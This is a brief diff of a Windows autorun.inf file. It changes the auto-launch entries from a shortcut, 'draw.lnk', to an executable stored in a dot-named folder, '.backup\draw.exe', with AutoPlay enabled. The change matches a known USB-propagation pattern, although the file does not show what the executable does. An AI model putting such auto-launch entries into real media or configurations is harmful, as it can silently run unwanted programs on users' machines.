@@ -1,5 +1,5 @@
 [autorun]
-open=draw.lnk
+open=.backup\draw.exe
 label=Draw
-shellexecute=draw.lnk
+shellexecute=.backup\draw.exe
 UseAutoPlay=1
